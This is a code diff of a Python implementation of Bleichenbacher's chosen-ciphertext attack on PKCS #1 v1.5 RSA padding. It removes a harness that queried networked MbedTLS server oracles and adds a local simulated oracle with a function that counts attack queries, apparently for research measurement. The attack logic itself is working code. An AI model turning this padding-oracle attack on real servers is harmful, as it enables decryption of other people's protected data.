@@ -2,9 +2,9 @@
 Chosen-ciphertext attack on PKCS #1 v1.5
 http://archiv.infsec.ethz.ch/education/fs08/secsem/bleichenbacher98.pdf
 """
-from oracles import MbedTLS_Oracle
+from oracles import PKCS1_v1_5_Oracle
+from Crypto.PublicKey import RSA
 from os import urandom
-from attack_args import parse_args, read_pubkey
 from PKCS_1_5 import parse
 import subprocess
 import tempfile
@@ -14,7 +14,6 @@ import time
 import sys
 
 
-verbosity = 0
 total_queries = 0
 
 def egcd(a, b):
@@ -87,12 +86,6 @@ def merge_intervals(intervals):
     return merged
 
 
-def one_query(oracle, content):
-    oracle.add_query(None, content)
-    _, result = oracle.wait_query()
-    return result
-
-
 def blinding(k, key, c, oracle):
     """
     Step 1 of the attack
@@ -103,35 +96,23 @@ def blinding(k, key, c, oracle):
     :return: integers s_0, c_0 s.t. c_0 represents a conforming encryption and c_0 = (c * (s_0) ** e) mod n
     """
     global total_queries
-    if verbosity > 0:
-        total_queries += 1
-    if one_query(oracle, c.to_bytes(k, byteorder='big')):
+    total_queries += 1
+    if oracle.query(c.to_bytes(k, byteorder='big')):
         return 1, c
     while True:
         s_0 = urandom(k)
         s_0 = int.from_bytes(s_0, byteorder='big') % key.n
         # Check if c_0 as defined in the attack conforms and return it if it does.
         c_0 = (c * pow(s_0, key.e, key.n)) % key.n
-        if verbosity > 0:
-            total_queries += 1
-        if one_query(oracle, c_0.to_bytes(k, byteorder='big')):
+        total_queries += 1
+        if oracle.query(c_0.to_bytes(k, byteorder='big')):
             return s_0, c_0
 
 
-def s_c_conform(key, c, s, oracle, k, num_queries=None):
+def s_c_conform(key, c, s, oracle, k):
     global total_queries
-    if num_queries is None:
-        num_queries = len(oracle)
-    if verbosity > 0:
-        total_queries += num_queries
-    for i in range(num_queries):
-        oracle.add_query(i, ((c * pow(s + i, key.e, key.n)) % key.n).to_bytes(k, byteorder='big'))
-    retval = -1
-    for _ in range(num_queries):
-        i, result = oracle.wait_query()
-        if result and retval == -1:
-            retval = s + i
-    return retval
+    total_queries += 1
+    return oracle.query(((c * pow(s, key.e, key.n)) % key.n).to_bytes(k, byteorder="big"))
 
 def find_min_conforming(key, c_0, min_s, oracle, k_arg=None):
     """
@@ -149,10 +130,9 @@ def find_min_conforming(key, c_0, min_s, oracle, k_arg=None):
     # Find the minimal s_i >= min_s such that the expression defined in the attack conforms.
     s_i = min_s
     while True:
-        res = s_c_conform(key, c_0, s_i, oracle, k_arg)
-        if res != -1:
-            return res
-        s_i += len(oracle)
+        if s_c_conform(key, c_0, s_i, oracle, k_arg):
+            return s_i
+        s_i += 1
 
 
 def search_single_interval(key, B, prev_s, a, b, c_0, oracle, k_arg=None):
@@ -178,10 +158,9 @@ def search_single_interval(key, B, prev_s, a, b, c_0, oracle, k_arg=None):
         end_s -= int(egcd(3 * B + r_i * key.n, a) == a)
         s_i = start_s
         while s_i < end_s:
-            res = s_c_conform(key, c_0, s_i, oracle, k_arg)
-            if res != -1:
-                return res
-            s_i += len(oracle)
+            if s_c_conform(key, c_0, s_i, oracle, k_arg):
+                return s_i
+            s_i += 1
         r_i += 1
 
 
@@ -219,17 +198,14 @@ def bleichenbacher_attack(k, key, c, oracle):
 
     c = int.from_bytes(c, byteorder="big")
     s_0, c_0 = blinding(k, key, c, oracle)
-
-    print("Blinding complete")
+    if total_queries != 1:
+        return None
 
     m = [(2 * B, 3 * B - 1)]
 
     i = 1
     while True:
-        if verbosity > 0:
-            print("Round ", i, " (total queries %d)" % total_queries)
-        else:
-            print("Round ", i)
+        # print("Round ", i, "(%d queries)" % total_queries)
         if i == 1:
             s = find_min_conforming(key, c_0, divceil(key.n, 3 * B), oracle, k_arg=k)
         elif len(m) > 1:
@@ -252,24 +228,12 @@ def bleichenbacher_attack(k, key, c, oracle):
     else:
         return None
 
-if __name__ == "__main__":
-    args = parse_args()
-    verbosity = args.verbose
-    k = int(args.n_length / 8)
-    with open(args.public_key, "rb") as keyfile:
-        pub_key = read_pubkey(keyfile, k)
 
-    oracle = MbedTLS_Oracle(port=args.server_port, stage=args.stage, num_servers=args.num_servers)
-
-    if args.given_enc is not None:
-        with open(args.given_enc, "rb") as f:
-            c = f.read()
-    else:
-        c = b'\x00' + (k - 1) * bytes([1])
-
-    result = bleichenbacher_attack(k, pub_key, c, oracle)
-    print(result)
-    if result is not None:
-        print("Unpadded:")
-        print(parse(result).hex())
-
+def count_rounds(key, enc, keylen):
+    global total_queries
+    total_queries = 0
+    oracle = PKCS1_v1_5_Oracle(key)
+    result = bleichenbacher_attack(keylen, key, enc, oracle)
+    if result is None:
+        return None
+    return total_queries
